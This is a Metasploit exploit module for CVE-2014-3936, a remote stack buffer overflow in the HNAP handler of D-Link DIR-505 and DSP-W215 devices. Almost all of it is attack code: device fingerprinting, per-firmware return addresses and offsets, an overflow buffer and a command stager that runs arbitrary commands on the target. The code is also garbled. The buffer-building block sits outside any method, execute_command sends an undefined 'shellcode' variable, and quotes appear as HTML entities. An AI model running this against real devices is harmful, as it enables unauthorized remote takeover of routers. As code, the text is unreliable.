# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;D-Link HNAP Request Remote Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an anonymous remote code execution vulnerability on different
        D-Link devices. The vulnerability is due to an stack based buffer overflow while
        handling malicious HTTP POST requests addressed to the HNAP handler. This module
        has been successfully tested on D-Link DIR-505 in an emulated environment.
      },
      &#039;Author&#039;         =>
        [
          &#039;Craig Heffner&#039;, # vulnerability discovery and initial exploit
          &#039;Michael Messner <devnull[at]s3cur1ty.de>&#039; # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Arch&#039;           => ARCH_MIPSBE,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2014-3936&#039;],
          [&#039;BID&#039;, &#039;67651&#039;],
          [&#039;URL&#039;, &#039;http://www.devttys0.com/2014/05/hacking-the-d-link-dsp-w215-smart-plug/&#039;], # blog post from Craig including PoC
          [&#039;URL&#039;, &#039;http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10029&#039;]
        ],
      &#039;Targets&#039;        =>
        [
          #
          # Automatic targeting via fingerprinting
          #
          [ &#039;Automatic Targeting&#039;, { &#039;auto&#039; => true }  ],
          [ &#039;D-Link DSP-W215 - v1.0&#039;,
            {
              &#039;Offset&#039;  => 1000000,
              &#039;Ret&#039;     => 0x405cac, # jump to system - my_cgi.cgi
            }
          ],
          [ &#039;D-Link DIR-505 - v1.06&#039;,
            {
              &#039;Offset&#039;  => 30000,
              &#039;Ret&#039;     => 0x405234, # jump to system - my_cgi.cgi
            }
          ],
          [ &#039;D-Link DIR-505 - v1.07&#039;,
            {
              &#039;Offset&#039;  => 30000,
              &#039;Ret&#039;     => 0x405c5c, # jump to system - my_cgi.cgi
            }
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;May 15 2014&#039;,
      &#039;DefaultTarget&#039;  => 0))

    deregister_options(&#039;CMDSTAGER::DECODER&#039;, &#039;CMDSTAGER::FLAVOR&#039;)
  end

  def check
    begin
      res = send_request_cgi({
        &#039;uri&#039; => "/HNAP1/",
        &#039;method&#039;  => &#039;GET&#039;
      })

      if res && [200, 301, 302].include?(res.code)
        if res.body =~ /DIR-505/ && res.body =~ /1.07/
          @my_target = targets[3] if target[&#039;auto&#039;]
          return Exploit::CheckCode::Appears
        elsif res.body =~ /DIR-505/ && res.body =~ /1.06/
          @my_target = targets[2] if target[&#039;auto&#039;]
          return Exploit::CheckCode::Appears
        elsif res.body =~ /DSP-W215/ && res.body =~ /1.00/
          @my_target = targets[1] if target[&#039;auto&#039;]
          return Exploit::CheckCode::Appears
        else
          return Exploit::CheckCode::Detected
        end
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Safe
    end

    Exploit::CheckCode::Unknown
  end

  def exploit
    print_status("#{peer} - Trying to access the vulnerable URL...")

    @my_target = target
    check_code = check

    unless check_code == Exploit::CheckCode::Detected || check_code == Exploit::CheckCode::Appears
      fail_with(Failure::NoTarget, "#{peer} - Failed to detect a vulnerable device")
    end

    if @my_target.nil? || @my_target[&#039;auto&#039;]
      fail_with(Failure::NoTarget, "#{peer} - Failed to auto detect, try setting a manual target...")
    end

    print_status("#{peer} - Exploiting #{@my_target.name}...")
    execute_cmdstager(
      :flavor  => :echo,
      :linemax => 185
    )
  end

    buf = rand_text_alpha_upper(@my_target[&#039;Offset&#039;])  # Stack filler
    buf << rand_text_alpha_upper(4)                    # $s0, don&#039;t care
    buf << rand_text_alpha_upper(4)                    # $s1, don&#039;t care
    buf << rand_text_alpha_upper(4)                    # $s2, don&#039;t care
    buf << rand_text_alpha_upper(4)                    # $s3, don&#039;t care
    buf << rand_text_alpha_upper(4)                    # $s4, don&#039;t care
    buf << [@my_target.ret].pack("N")                  # $ra

           # la $t9, system
           # la $s1, 0x440000
           # jalr $t9 ; system
           # addiu $a0, $sp, 0x28 # our command

    buf << rand_text_alpha_upper(40)                # Stack filler
    buf << cmd                                      # Command to execute
    buf << "\x00"                                   # NULL-terminate the command
  end

  def execute_command(cmd, opts)

    begin
      res = send_request_cgi({
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039; => "/HNAP1/",
        &#039;encode_params&#039; => false,
        &#039;data&#039; => shellcode
      }, 5)
      return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end
end

